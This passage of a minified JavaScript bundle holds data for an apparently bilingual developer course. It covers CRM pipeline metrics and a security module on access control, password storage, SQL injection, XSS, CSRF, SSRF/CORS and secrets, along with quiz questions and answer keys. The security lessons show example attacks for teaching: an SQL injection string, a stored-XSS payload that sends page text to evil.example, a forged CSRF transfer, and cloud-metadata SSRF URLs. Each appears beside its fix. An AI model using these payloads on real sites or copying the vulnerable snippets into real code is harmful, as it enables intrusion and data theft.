Quote → won: 20 / 80 = 25%`},{type:"text",text:`**Conversion rate** (tỷ lệ chuyển đổi) is how many move to the next stage, divided by how many entered. It shows where deals get stuck.
VI: **Tỷ lệ chuyển đổi** là số lượng đi tiếp sang bước sau chia cho số lượng đã vào bước đó. Nó cho thấy thương vụ bị kẹt ở đâu.`},{type:"text",text:`**Average order value** (AOV, giá trị đơn trung bình) is revenue divided by the number of orders. For example, 120,000,000 from 400 orders gives 300,000.
VI: **Giá trị đơn trung bình** (AOV) là doanh thu chia cho số đơn. Ví dụ 120.000.000 từ 400 đơn thì AOV là 300.000.`},{type:"example",title:"An office furniture team",text:`A lead fills a form on Facebook. A salesperson calls and opens an opportunity worth 50,000,000. They send a quote and set a follow-up task in 3 days. The deal is lost with reason "price too high". The manager sees most deals die at the quote stage.
VI: Một lead điền form trên Facebook. Nhân viên gọi điện và tạo cơ hội trị giá 50.000.000. Họ gửi báo giá và đặt việc gọi lại sau 3 ngày. Thương vụ thua với lý do "giá cao". Quản lý thấy phần lớn thương vụ rớt ở bước báo giá.`},{type:"code",code:{lang:"text",text:`Lead(Id, Name, Phone, Email, Source,
  Status, OwnerId)
Opportunity(Id, CustomerId, Stage, Value,
  ExpectedClose, LostReason, OwnerId)
StageHistory(OpportunityId, FromStage,
  ToStage, ChangedAt, ChangedBy)
Activity(Id, OpportunityId, Type, DueAt,
  DoneAt, Note)  -- calls, meetings, follow-ups
-- Stage: New → Qualified → Quoted
--        → Won | Lost`}},{type:"list",items:[`Is revenue counted at order, at invoice, or at payment?
VI: Doanh thu tính theo đơn hàng, theo hóa đơn, hay theo tiền đã thu?`,`Do cancelled and returned orders count in AOV?
VI: Đơn hủy và đơn trả hàng có tính vào AOV không?`,`Same phone, different name: merge the leads or not?
VI: Cùng số điện thoại, khác tên: có gộp lead không?`,`When a salesperson leaves, who owns their leads?
VI: Khi nhân viên nghỉ việc, lead của họ chuyển cho ai?`]}],remember:`Keep every stage change with a date, and agree what each KPI counts before you build the dashboard.
VI: Lưu mọi lần đổi giai đoạn kèm ngày giờ, và thống nhất mỗi KPI tính gì trước khi làm dashboard.`,questions:[{id:"sales.crm-pipeline.1",kind:"mcq",difficulty:"easy",prompt:`Revenue this month is 60,000,000 from 200 orders. What is the average order value?
VI: Doanh thu tháng này 60.000.000 từ 200 đơn. Giá trị đơn trung bình là bao nhiêu?`,choices:["3,000,000","30,000","300,000","120,000"],answer:2,why:`AOV = revenue / number of orders = 60,000,000 / 200 = 300,000.
VI: AOV = doanh thu / số đơn = 60.000.000 / 200 = 300.000.`},{id:"sales.crm-pipeline.2",kind:"debug",difficulty:"medium",prompt:`The sales dashboard shows revenue of 1.2 billion for May. The accounting report shows 1.05 billion. Both queries have no bugs. What is the most likely reason?
VI: Dashboard bán hàng báo doanh thu tháng 5 là 1,2 tỷ. Báo cáo kế toán ghi 1,05 tỷ. Cả hai câu truy vấn đều không lỗi. Lý do khả năng cao nhất là gì?`,choices:["The dashboard rounds each order up to the nearest thousand","The accounting database is a replica that is 1 day behind","The dashboard counts each order once per line on the order","They count different things, like orders versus invoices"],answer:3,why:`Sales often counts confirmed orders. Accounting counts invoices, minus returns. Agree on one definition, or label each number clearly.
VI: Bán hàng thường tính theo đơn đã xác nhận. Kế toán tính theo hóa đơn, trừ hàng trả. Hãy thống nhất một định nghĩa, hoặc ghi rõ nhãn cho từng con số.`},{id:"sales.crm-pipeline.3",kind:"compare",difficulty:"medium",prompt:`The manager wants to know how long deals stay in each stage. Which design is better?
VI: Quản lý muốn biết thương vụ nằm ở mỗi giai đoạn bao lâu. Thiết kế nào tốt hơn?`,choices:["Keep only the current `Stage` column and overwrite it on change","Keep `Stage`, plus a history row for every stage change with a date"],answer:1,why:`Overwriting loses the past. A history table lets you measure time per stage and see where deals stall.
VI: Ghi đè sẽ mất dữ liệu cũ. Bảng lịch sử giúp đo thời gian ở từng giai đoạn và thấy thương vụ bị kẹt ở đâu.`},{id:"sales.crm-pipeline.4",kind:"scenario",difficulty:"hard",prompt:"One person appears as 3 leads: `0912 345 678`, `+84912345678` and `0912345678`. Three salespeople call them. What is the best fix?\nVI: Một người xuất hiện thành 3 lead: `0912 345 678`, `+84912345678` và `0912345678`. Ba nhân viên cùng gọi cho họ. Cách sửa nào tốt nhất?",choices:["Add a note in the form asking people not to sign up twice","Normalize phone numbers before saving, then check duplicates","Let each salesperson keep their own lead to stay motivated","Make the phone field optional so fewer duplicates are found"],answer:1,why:`All three are the same number in different formats. Store one standard format, then a duplicate check works. Merge rules still need the business.
VI: Cả ba là cùng một số nhưng khác định dạng. Lưu theo một định dạng chuẩn thì kiểm tra trùng mới chạy đúng. Quy tắc gộp vẫn cần nghiệp vụ quyết định.`}]}],cheatSheet:[{title:"Documents · Chứng từ",items:[{term:"Quote · Báo giá",meaning:`A price offer the customer can accept.
VI: Đề nghị giá để khách chấp nhận hoặc không.`},{term:"Sales order · Đơn bán hàng",meaning:`The agreed order: items, quantities, saved prices.
VI: Đơn đã thống nhất: mặt hàng, số lượng, giá đã lưu.`},{term:"Delivery · Phiếu xuất kho",meaning:`Goods leave the warehouse; can be partial.
VI: Hàng ra khỏi kho; có thể giao một phần.`},{term:"Invoice · Hóa đơn",meaning:`Creates a debt the customer must pay.
VI: Tạo khoản công nợ phải thu của khách.`},{term:"Return order · Đơn trả hàng",meaning:`Goods coming back, linked to the original line.
VI: Hàng trả về, gắn với dòng của đơn gốc.`},{term:"Credit note · Hóa đơn điều chỉnh",meaning:`Reduces what the customer owes after a return.
VI: Giảm số tiền khách nợ sau khi trả hàng.`}]},{title:"Customers and money · Khách hàng và tiền",items:[{term:"Credit limit · Hạn mức công nợ",meaning:`Most a customer may owe: owed now + new order ≤ limit.
VI: Mức nợ tối đa: nợ hiện tại + đơn mới ≤ hạn mức.`},{term:"Payment terms · Thời hạn thanh toán",meaning:`Days the customer has to pay, for example 30.
VI: Số ngày khách được nợ, ví dụ 30 ngày.`},{term:"Price list · Bảng giá",meaning:`Prices with valid-from and valid-to dates.
VI: Giá kèm ngày bắt đầu và kết thúc hiệu lực.`},{term:"Saved line price · Giá lưu trên dòng",meaning:`Copy the price at order time; never re-read it.
VI: Sao chép giá lúc đặt đơn; không đọc lại sau đó.`},{term:"Line / order discount · Chiết khấu dòng / đơn",meaning:`One item vs the whole order; agree the order of use.
VI: Một mặt hàng hay cả đơn; thống nhất thứ tự áp dụng.`},{term:"Rounding rule · Quy tắc làm tròn",meaning:`Per line or per total; one rule in every system.
VI: Theo dòng hay theo tổng; một quy tắc cho mọi hệ thống.`}]},{title:"Stock · Tồn kho",items:[{term:"On hand · Tồn thực tế",meaning:`What is physically in the warehouse.
VI: Số hàng thực có trong kho.`},{term:"Reserved · Đã giữ",meaning:`Promised to confirmed orders, not yet shipped.
VI: Đã hứa cho đơn đã xác nhận, chưa xuất kho.`},{term:"Available to promise · Có thể bán",meaning:`Simple form: on hand − reserved.
VI: Dạng đơn giản: tồn thực tế − đã giữ.`},{term:"Backorder · Đơn chờ hàng",meaning:`Wanted but short; waits for new stock.
VI: Khách vẫn muốn mua nhưng thiếu hàng; chờ hàng về.`},{term:"Oversell · Bán vượt tồn",meaning:`Selling more than you have; check and reserve in one step.
VI: Bán nhiều hơn số đang có; kiểm tra và giữ hàng trong một bước.`}]},{title:"Shops and CRM · Cửa hàng và CRM",items:[{term:"POS · Máy bán hàng tại quầy",meaning:`Cashier app; must work offline with device-made ids.
VI: Phần mềm thu ngân; phải chạy offline với mã tạo trên máy.`},{term:"Shift close · Chốt ca",meaning:`Count the drawer and compare with expected cash.
VI: Đếm két và so với số tiền dự kiến.`},{term:"Abandoned cart · Giỏ hàng bỏ dở",meaning:`Items added online but never paid.
VI: Hàng đã thêm vào giỏ nhưng không thanh toán.`},{term:"Lead / Opportunity · Khách tiềm năng / Cơ hội",meaning:`Someone who may buy / a real deal with a value.
VI: Người có thể mua / thương vụ thật có giá trị.`},{term:"Conversion rate · Tỷ lệ chuyển đổi",meaning:`Moved on ÷ entered, per stage of the funnel.
VI: Số đi tiếp ÷ số đã vào, ở từng bước của phễu.`},{term:"AOV · Giá trị đơn trung bình",meaning:`Revenue ÷ number of orders.
VI: Doanh thu ÷ số đơn hàng.`}]}]},le=Object.freeze(Object.defineProperty({__proto__:null,default:ce},Symbol.toStringTag,{value:"Module"})),de={id:"security",title:"Security",emoji:"🔐",tagline:"Injection, XSS, CSRF, secrets — and how to stop them",lessons:[{id:"security.access-control",title:"Logged in is not the same as allowed",summary:"Broken access control: the most common API bug.",minutes:4,blocks:[{type:"text",text:`**Authentication** = proving who you are.
**Authorization** = checking what you may do.
Many real data leaks are not clever hacks. The user is logged in, and the code simply forgets to ask: **"Is this yours?"**`},{type:"code",code:{lang:"csharp",text:`// ❌ Any logged-in user can read ANY invoice
[Authorize]
[HttpGet("invoices/{id}")]
public async Task<IActionResult> Get(int id)
{
    var invoice = await db.Invoices.FindAsync(id);
    return Ok(invoice);
}

// ✅ Only finds the invoice if it belongs to the caller
var invoice = await db.Invoices.SingleOrDefaultAsync(
    i => i.Id == id && i.UserId == currentUserId);
if (invoice is null) return NotFound();`}},{type:"example",title:"IDOR in one minute",text:"**IDOR** = Insecure Direct Object Reference. A user changes `/invoices/1043` to `/invoices/1044` and sees someone else's invoice. Scanning tools try this automatically, for every id."},{type:"list",items:["Check permissions on the **server**, on every request. Hiding a button in React or Vue is UX, not security.","**Deny by default**: new endpoints need auth unless someone marks them public on purpose.","**Least privilege**: give users, services and DB logins only the rights they really need.","Do not bind request bodies directly to database entities. Use a DTO with only the fields the user may change."]}],remember:'Logged in ≠ allowed. Check "is this yours?" on the server, every time.',questions:[{id:"security.access-control.1",kind:"code",difficulty:"medium",prompt:"Using the ❌ code from the lesson, a logged-in tester changes the URL from `/invoices/1043` (theirs) to `/invoices/1044`. What do they get?",code:{lang:"csharp",text:`[Authorize]
[HttpGet("invoices/{id}")]
public async Task<IActionResult> Get(int id)
{
    var invoice = await db.Invoices.FindAsync(id);
    return Ok(invoice);
}`},choices:["401, because the invoice belongs to another user","403, because [Authorize] checks ownership","Another customer's invoice","404, because ids are private"],answer:2,why:"`[Authorize]` only checks that someone is logged in. Nothing checks ownership, so any id works for any user.",remember:'[Authorize] = logged in. It does not mean "owns this".'},{id:"security.access-control.2",kind:"scenario",difficulty:"easy",prompt:'The "Delete user" button is hidden in the Vue app for non-admins. The API endpoint has `[Authorize]` but no role check. Is it safe?',choices:["Yes, normal users cannot see the button","No, any logged-in user can call the API directly","Yes, `[Authorize]` means admins only","Yes, as long as the site uses HTTPS"],answer:1,why:'Anyone can send HTTP requests with DevTools, curl or a script. The UI is not a security boundary. The API must check the role, for example with `[Authorize(Roles = "Admin")]` or a policy.'},{id:"security.access-control.3",kind:"compare",difficulty:"medium",prompt:"A reporting service only reads sales data. Which database login follows **least privilege**?",choices:["`db_owner`, so reports never fail on rights","`sa`, with a strong password rotated monthly","A login with SELECT on the sales tables only","The main app login, to avoid an extra account"],answer:2,why:"If the reporting service is hacked or has a bug, a read-only login on a few tables limits the damage. The others could delete or change everything.",remember:"Least privilege = less damage when something goes wrong."},{id:"security.access-control.4",kind:"code",difficulty:"hard",prompt:'A user sends `{"name":"Ann","isAdmin":true}` to this endpoint. What happens?',code:{lang:"csharp",text:`public class User
{
    public int Id { get; set; }
    public string Name { get; set; } = "";
    public bool IsAdmin { get; set; }
}

[Authorize]
[HttpPut("users/me")]
public async Task<IActionResult> Update(User body)
{
    body.Id = CurrentUserId;
    db.Users.Update(body);   // saves every property
    await db.SaveChangesAsync();
    return NoContent();
}`},choices:["EF Core ignores IsAdmin, so only the name changes","The request fails with 400","The user makes themselves an admin","[Authorize] blocks the IsAdmin field"],answer:2,why:"Model binding fills every public property, including `IsAdmin`, and `Update` saves them all. This is called **over-posting** (mass assignment). Accept a DTO with only `Name` instead.",remember:"Bind requests to DTOs, not entities."}]},{id:"security.passwords",title:"Storing passwords",summary:"Slow hash + salt. Never plain SHA-256.",minutes:4,blocks:[{type:"text",text:"Rule 1: never store the password itself. Store a **hash** from a **slow password-hashing function**. A hash is a one-way fingerprint: you cannot turn it back into the password. At login, hash the typed password the same way and compare the two hashes."},{type:"compare",left:{title:"Bad ❌",items:["Plain text","Encrypted (the key can leak too)","MD5, SHA-1, or SHA-256 alone — fast, a GPU tries billions of guesses per second","No salt, or one salt for everybody"]},right:{title:"Good ✅",items:["Argon2id, bcrypt, or PBKDF2 with many iterations","A unique random salt per user","Slow on purpose, with a cost setting you can raise","From a well-known library — never write your own"]}},{type:"text",text:"A **salt** is a random value stored next to the hash. Two users with the same password get different hashes. Attackers cannot use ready-made tables of hashes. They must crack each user separately."},{type:"diagram",text:`"Summer2026!" + salt A ─► Argon2id ─► $argon2id$...x9Q
"Summer2026!" + salt B ─► Argon2id ─► $argon2id$...p3L
  same password, different hashes`},{type:"code",code:{lang:"csharp",text:`// ASP.NET Core Identity: PBKDF2 + random salt built in
var hasher = new PasswordHasher<User>();
user.PasswordHash = hasher.HashPassword(user, password);

var result = hasher.VerifyHashedPassword(
    user, user.PasswordHash, attempt);
bool ok = result != PasswordVerificationResult.Failed;`}},{type:"code",code:{lang:"ts",text:`// Node.js with the "argon2" package (salt is automatic)
import argon2 from 'argon2';

const hash = await argon2.hash(password);
const ok = await argon2.verify(hash, attempt);`}},{type:"list",items:['Login errors: say "wrong email or password", not which one was wrong.',"Limit login attempts (rate limit, lockout) to slow down guessing.","Never log passwords — not even in debug logs."]}],remember:"Passwords → slow hash (Argon2id / bcrypt / PBKDF2) + unique salt. Never plain SHA-256.",questions:[{id:"security.passwords.1",kind:"compare",difficulty:"medium",prompt:"Which way of storing passwords is best?",choices:["`SHA256(password)`","`AES.Encrypt(password)` with the key in appsettings",'`SHA256(password + "MyAppSalt")`',"bcrypt with a per-user salt and a good cost"],answer:3,why:"bcrypt is slow on purpose and gives each user their own salt. SHA-256 is fast, so guessing is cheap. A shared salt still lets attackers crack all users in one run. Anyone who gets the AES key can decrypt every password."},{id:"security.passwords.2",kind:"mcq",difficulty:"medium",prompt:"SHA-256 is a secure hash function. Why is it still a bad choice for passwords on its own?",choices:["It is too slow and makes logins time out under load","It is fast, so attackers can test billions of guesses","It can be reversed to the password with the right key","Its 256-bit output is too long for most user tables"],answer:1,why:"SHA-256 was built to be fast. For passwords, speed helps the attacker. Password hashes like Argon2id and bcrypt are slow, and you can set how slow. Each guess costs the attacker real time.",remember:"For passwords, slow is a feature."},{id:"security.passwords.3",kind:"debug",difficulty:"hard",prompt:"Your users table leaks. You notice 300 users have **exactly the same** password hash value. What does that tell you about how passwords were stored?",choices:["Nothing, hash collisions are common","Passwords were encrypted, not hashed","bcrypt was used correctly","No unique salt per user was used"],answer:3,why:"With a unique salt, even equal passwords give different hashes. Equal hashes mean no salt (or a shared one) — and those 300 people probably used the same weak password."},{id:"security.passwords.4",kind:"scenario",difficulty:"medium",prompt:'The login page says "No account exists with this email" for unknown emails, and "Wrong password" otherwise. What is the risk?',choices:["None, clear messages like this are good for users","It makes the stored password hashes easier to crack","Attackers can find out which emails have accounts","The extra email lookup makes each login much slower"],answer:2,why:'This is called **user enumeration**. A list of real accounts makes phishing and password guessing easier. Use one message: "wrong email or password". Do the same for "forgot password".'}]},{id:"security.injection",title:"SQL injection",summary:"When user input becomes part of your SQL.",minutes:4,blocks:[{type:"text",text:"**Injection** happens when user input becomes part of the **code** (here: SQL) instead of staying **data**."},{type:"code",code:{lang:"csharp",text:`// ❌ string concatenation
var sql = "SELECT * FROM Users WHERE Email = '" + email + "'";

// attacker sends:  ' OR '1'='1
// SQL becomes:
// SELECT * FROM Users WHERE Email = '' OR '1'='1'
// → returns every user`}},{type:"code",code:{lang:"csharp",text:`// ✅ parameter: the value travels separately from the SQL
using var cmd = new SqlCommand(
    "SELECT * FROM Users WHERE Email = @email", conn);
cmd.Parameters.Add("@email", SqlDbType.NVarChar, 256).Value = email;

// ✅ EF Core LINQ is parameterized for you
var user = await db.Users.SingleOrDefaultAsync(u => u.Email == email);`}},{type:"code",code:{lang:"ts",text:`// ❌ template string pastes input into the SQL
await pool.query(\`SELECT * FROM users WHERE email = '\${email}'\`);

// ✅ placeholder + values (node-postgres)
await pool.query('SELECT * FROM users WHERE email = $1', [email]);`}},{type:"list",items:["**Parameters** are the fix. Escaping quotes by hand is not.","ORMs are safe by default, but raw SQL helpers (like EF Core `FromSqlRaw` with string building) can still be unsafe.","Table and column names cannot be parameters. For `ORDER BY` from user input, use an **allowlist**.","**Input validation** (length, format, allowed values) is a good extra layer, but never a replacement for parameters.","Least privilege limits damage: the app login should not be able to `DROP TABLE`."]}],remember:"User input is data, never code. Use parameters.",questions:[{id:"security.injection.1",kind:"code",difficulty:"easy",prompt:"What is wrong with this search?",code:{lang:"ts",text:`app.get('/products', async (req, res) => {
  const q = req.query.q;
  const rows = await db.query(
    \`SELECT * FROM products WHERE name LIKE '%\${q}%'\`
  );
  res.json(rows);
});`},choices:["Nothing, template strings escape values","LIKE does not support the % wildcard","SQL injection: the input is pasted into the SQL","It should use double quotes"],answer:2,why:"A JS template string is plain string building. Use a placeholder and pass `%${q}%` as a parameter value instead."},{id:"security.injection.2",kind:"code",difficulty:"hard",prompt:"Which EF Core line is vulnerable to SQL injection?",code:{lang:"csharp",text:`// A
db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Name = '{name}'");

// B
db.Users.FromSql($"SELECT * FROM Users WHERE Name = {name}");`},choices:["A","B","Both","Neither, EF Core always uses parameters"],answer:0,why:'`FromSqlRaw` takes a plain string. C# builds the `$""` string first, so `name` is already inside the SQL text. `FromSql` (EF Core 7+; `FromSqlInterpolated` in older versions) keeps `{name}` apart and sends it as a real parameter.',remember:"FromSqlRaw + string building = injection."},{id:"security.injection.3",kind:"scenario",difficulty:"medium",prompt:'A sortable table sends `?sort=price`. The API builds `"... ORDER BY " + sort`. You cannot use a parameter for a column name. What is the safest fix?',choices:["Escape single quotes in `sort` before adding it","Limit `sort` to 20 characters and trim spaces","Map `sort` to a fixed list of allowed columns","Reject `sort` if it contains the word DROP"],answer:2,why:"An allowlist means only known values like `price` or `name` can reach the SQL. Anything else gets a default or a 400. Attackers can get around escaping and length limits."},{id:"security.injection.4",kind:"truefalse",difficulty:"medium",prompt:"If the frontend form checks that the email looks valid, the API does not need parameterized queries.",choices:["True","False"],answer:1,why:"Attackers can skip your frontend and call the API directly. Client-side validation is for user experience. The server must validate and use parameters.",remember:"Frontend validation = UX. Server validation = security."}]},{id:"security.xss",title:"XSS: when user text becomes script",summary:"React and Vue protect you — unless you turn the protection off.",minutes:4,blocks:[{type:"text",text:"**XSS** (cross-site scripting) = an attacker gets their JavaScript to run in **your** page, in **another user's** browser. That script can do anything the user can do. For example, it can read the page, call your API as the user, or show a fake login form."},{type:"example",title:"Stored XSS",text:`A user posts this comment:
\`<img src=x onerror="fetch('https://evil.example/?d='+document.body.innerText)">\`
The site saves it and renders it as HTML for every visitor. Every visitor now runs the attacker's code.`},{type:"text",text:"Good news: React and Vue **escape** text by default. `{comment}` in JSX or `{{ comment }}` in Vue shows the characters `<img ...>` as text. Nothing runs. The danger comes when you **turn this off**:"},{type:"code",code:{lang:"ts",text:`// React
<p>{comment}</p>                                     // ✅ escaped
<p dangerouslySetInnerHTML={{ __html: comment }} />  // ❌ raw HTML

// Vue template
<p>{{ comment }}</p>          <!-- ✅ escaped -->
<p v-html="comment"></p>      <!-- ❌ raw HTML -->`}},{type:"list",items:["Must show user HTML (rich text)? **Sanitize** it first: remove dangerous tags and attributes with a library like DOMPurify. Use an allowlist of tags.","Check URLs from users: `javascript:alert(1)` is a valid `href`. Allow only `http:` and `https:`.","Avoid `innerHTML`, `document.write` and `eval` with user data.","`HttpOnly` cookies stop a script from **reading** the session cookie. But XSS can still call your API as the user.","A **Content Security Policy** (CSP) header is a strong extra layer: it limits which scripts can run."]}],remember:"Render user data as text. Raw HTML (dangerouslySetInnerHTML, v-html) only after sanitizing.",questions:[{id:"security.xss.1",kind:"code",difficulty:"easy",prompt:"`user.bio` contains `<script>alert(1)<\/script>`. What does this React component show?",code:{lang:"ts",text:`function Profile({ user }: { user: User }) {
  return <div>{user.bio}</div>;
}`},choices:["An alert box pops up when the page loads","React throws an error about unsafe HTML","The tag is shown on screen as plain text","An empty div, because React strips the tag"],answer:2,why:"React escapes values in `{}`. The browser shows the characters `<script>...` on screen and does not run them."},{id:"security.xss.2",kind:"scenario",difficulty:"medium",prompt:'The product team wants bold text and links in user comments. A developer proposes `<div v-html="comment">`. What should you do?',choices:["Fine — Vue cleans v-html for you","Sanitize the HTML with an allowlist first","Fine, as long as comments are saved in the database","Fine, as long as the page uses HTTPS"],answer:1,why:"`v-html` inserts raw HTML with no cleaning. Sanitize on the server or client with an allowlist (DOMPurify), or use Markdown with a safe renderer.",remember:"v-html / dangerouslySetInnerHTML = you are responsible."},{id:"security.xss.3",kind:"code",difficulty:"hard",prompt:'Users can set a "website" link in their profile. What is the risk here?',code:{lang:"ts",text:"<a href={user.website}>Website</a>"},choices:["None, React escapes every value in JSX","Very long URLs can break the page layout","The link opens in the same tab, not a new one","A `javascript:` URL can run code on click"],answer:3,why:"Escaping protects text, not the meaning of a URL. `javascript:...` is a valid href. Do not rely on the framework here: validate that the URL starts with `http:` or `https:`."},{id:"security.xss.4",kind:"mcq",difficulty:"medium",prompt:"Your session cookie is `HttpOnly`. An XSS bug exists on your site. What can the attacker's script still do?",choices:["Call your API as the victim","Nothing — HttpOnly blocks XSS","Only read `document.cookie`","Only change the page CSS"],answer:0,why:"The script runs inside your page, so its requests carry the victim's cookie automatically. HttpOnly only stops stealing the cookie value. Fix the XSS itself."}]},{id:"security.csrf",title:"CSRF: requests the user did not mean to send",summary:"Your cookie, their request.",minutes:3,blocks:[{type:"text",text:"Browsers attach cookies **automatically**. **CSRF** (cross-site request forgery) uses this against you. Another website makes the user's browser send a request to **your** site. The user's cookie goes with it."},{type:"diagram",text:`1. User logs in to bank.example → cookie sid=...
2. User opens evil.example in another tab
3. evil page auto-submits a hidden form:
     POST https://bank.example/transfer
     to=attacker&amount=1000
4. Browser adds the bank cookie 🍪
   → bank sees a "real" logged-in request`},{type:"text",text:"The attacker cannot read the response. They do not need to — the damage is the **action** itself."},{type:"list",items:["**SameSite cookies**: `Lax` stops the cookie on cross-site POSTs; `Strict` stops it on all cross-site requests. Chrome treats cookies without SameSite as `Lax`, but not every browser does — set it yourself.","**Anti-forgery token**: a random value in the form or a header that evil.example cannot know. ASP.NET Core: `[ValidateAntiForgeryToken]` / the antiforgery services.","**Never change data with GET.**","APIs that use `Authorization: Bearer` tokens (not cookies) are mostly safe from CSRF. The browser does not add that header on its own."]},{type:"code",code:{lang:"http",text:"Set-Cookie: sid=a8f3k2; HttpOnly; Secure; SameSite=Lax"}}],remember:"CSRF = your cookie, their request. Defend with SameSite + anti-forgery tokens. No state changes on GET.",questions:[{id:"security.csrf.1",kind:"scenario",difficulty:"medium",prompt:'Your API uses cookie auth. A teammate says: "CORS only allows our domain, so CSRF is impossible." Are they right?',choices:["Yes, CORS stops the request from being sent","Yes, if the cookie is also HttpOnly","No, CORS only stops reading responses, not a form POST","No, because CORS only applies to GET"],answer:2,why:"A plain HTML form POST is sent without any CORS check. The browser adds the cookie, and the server does the action. CORS only decides who may **read** the response.",remember:"CORS does not stop CSRF."},{id:"security.csrf.2",kind:"mcq",difficulty:"medium",prompt:"Why does an anti-forgery token stop CSRF?",choices:["It encrypts the session cookie","It blocks all cross-origin requests","The evil site cannot know the token value","It makes the cookie HttpOnly"],answer:2,why:"The server checks for a secret token that only your own pages receive. The evil site can make the browser send the cookie, but it cannot read your page to get the token."},{id:"security.csrf.3",kind:"compare",difficulty:"hard",prompt:"Which of these APIs is **most** exposed to CSRF?",choices:["Uses a session cookie with `SameSite=None` and no anti-forgery token","Uses `Authorization: Bearer` with a token kept in JS memory","Uses a session cookie with `SameSite=Strict`","Server-to-server API with an API key header"],answer:0,why:"`SameSite=None` tells the browser to send the cookie on requests from other sites too. Nothing else checks where the request came from. The browser does not add Bearer headers or API keys automatically."}]},{id:"security.ssrf-cors",title:"SSRF and the CORS myth",summary:"Your server fetching evil URLs, and what CORS does not protect.",minutes:4,blocks:[{type:"text",text:"**SSRF** (server-side request forgery): your server fetches a URL that the **user** chose. The attacker picks a URL that only your server can reach."},{type:"code",code:{lang:"csharp",text:`// "Import avatar from URL" feature
[HttpPost("avatar/import")]
public async Task<IActionResult> Import(string url)
{
    var bytes = await http.GetByteArrayAsync(url); // ❌ any URL
    // ...
}`}},{type:"list",items:["Attacker sends `http://169.254.169.254/...` — the cloud metadata service. It can give out cloud credentials.","Or `http://localhost:8080/admin`, or an internal service on `10.x.x.x`.","Defense: **allowlist** hosts when you can (for example, only your CDN).","Otherwise, allow only `https`. Do the DNS lookup first. **Then** block private, loopback (`127.x`) and link-local (`169.254.x`) IPs. Check again on every redirect, or turn redirects off.","Network rules: the fetcher should not be able to reach internal services at all."]},{type:"text",text:"**CORS** (cross-origin resource sharing) **is not a firewall.** It tells **browsers** which other sites may read your responses. curl, Postman, scripts and servers ignore it. It never stops a request from reaching your API."},{type:"compare",left:{title:"CORS does",items:["Let browsers share responses with allowed origins","Stop evil sites from reading your API with a user's cookies"]},right:{title:"CORS does not",items:["Block curl, bots or scripts","Replace authentication or authorization","Stop a form POST from being sent (CSRF)"]}},{type:"example",title:"A dangerous config",text:"The server copies **any** `Origin` into `Access-Control-Allow-Origin`. It also sends `Allow-Credentials: true`. Now every website can read your logged-in users' data through their browsers."}],remember:"Never fetch any URL a user gives you. CORS protects browsers, not your server.",questions:[{id:"security.ssrf-cors.1",kind:"scenario",difficulty:"hard",prompt:"In the avatar import feature, an attacker submits `http://169.254.169.254/latest/meta-data/`. Why is this dangerous?",choices:["The response is a huge file that can fill the disk","Your server can reach internal hosts the attacker cannot","It triggers a CORS error that breaks the import page","It is a link-local IP, so the request loops back forever"],answer:1,why:"The request comes from inside your network. The metadata service and internal APIs trust it. If the response is shown or stored, the attacker may read secrets like cloud credentials.",remember:"SSRF = your server becomes the attacker's proxy."},{id:"security.ssrf-cors.2",kind:"debug",difficulty:"medium",prompt:"Your public API only allows `https://app.example.com` in CORS. A scraper still downloads all your product data with a script. Why?",choices:["CORS is checked only by browsers","The CORS policy is misconfigured","The scraper uses HTTPS","The scraper uses an older CORS version"],answer:0,why:"Scripts and servers do not apply CORS. To control access, use authentication, authorization and rate limiting."},{id:"security.ssrf-cors.3",kind:"code",difficulty:"hard",prompt:"The API uses cookie authentication. What is the risk of this CORS setup?",code:{lang:"csharp",text:`builder.Services.AddCors(o => o.AddDefaultPolicy(p => p
    .SetIsOriginAllowed(_ => true)   // any origin
    .AllowCredentials()
    .AllowAnyHeader()
    .AllowAnyMethod()));`},choices:["None, CORS only matters in browsers anyway","It blocks your own frontend from calling the API","Any website can read logged-in users' API data","Browsers stop sending cookies to this API"],answer:2,why:"An evil site can call your API from a victim's browser with `credentials: 'include'`. The browser sends the cookie, and this policy lets the evil site read the answer. Allow only your known origins."}]},{id:"security.secrets-https",title:"Secrets and HTTPS",summary:"Keep keys out of git and out of the bundle. Encrypt traffic with HTTPS.",minutes:4,blocks:[{type:"text",text:"A **secret** is anything that gives access: DB passwords, API keys, JWT signing keys, connection strings."},{type:"compare",left:{title:"Never put secrets in",items:["Git — history keeps them forever","Frontend code — the bundle is public","Logs and error messages"]},right:{title:"Put them in",items:["Dev: `dotnet user-secrets`, local `.env` (git-ignored)","Prod: environment variables or a vault (Azure Key Vault, AWS Secrets Manager)","Your backend — the browser calls the backend, the backend calls the paid API"]}},{type:"text",text:"In Vite, any `VITE_*` variable is copied into the JavaScript bundle. Anyone can open DevTools and read it. Other frontend build tools work the same way."},{type:"example",title:"Leaked a key?",text:"Deleting the line is not enough. **Rotate** first: create a new key and disable the old one. Then clean up the code and history."},{type:"text",text:"**HTTPS** encrypts traffic. Its certificate also proves that the server is the real one. Without it, anyone on the same Wi-Fi or network path can read or change requests: passwords, cookies, tokens."},{type:"code",code:{lang:"csharp",text:`// ❌ "fixes" a certificate error by trusting ANY certificate
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (_, _, _, _) => true
};`}},{type:"list",items:["Use HTTPS everywhere. Add **HSTS**: a header that tells browsers to refuse plain HTTP for your site.","Never turn off certificate checks in production. Fix the certificate instead.","HTTPS protects data only **while it travels** (in transit). It does not fix SQL injection, XSS or weak passwords."]}],remember:"Secrets live on the server, outside git. Leaked → rotate. HTTPS protects the network traffic, not your code.",questions:[{id:"security.secrets-https.1",kind:"scenario",difficulty:"easy",prompt:"A developer commits an API key, notices, and pushes a new commit that deletes it. Is it safe now?",choices:["Yes, the key is gone from the code","Yes, if the repository is private","No, it is in git history; rotate the key","No, but rewriting git history alone fixes it"],answer:2,why:"The old commit still has the key, and clones or forks may already exist. Rewriting history does not remove those copies. Only rotating the key makes the leaked one useless.",remember:"Leaked secret → rotate first."},{id:"security.secrets-https.2",kind:"code",difficulty:"medium",prompt:"A React + Vite app has this setup. What is the problem?",code:{lang:"ts",text:`// .env
// VITE_PAYMENT_SECRET_KEY=sk_live_abc123

await fetch('https://api.payments.example/charges', {
  method: 'POST',
  headers: {
    Authorization: \`Bearer \${import.meta.env.VITE_PAYMENT_SECRET_KEY}\`,
  },
  body: JSON.stringify(charge),
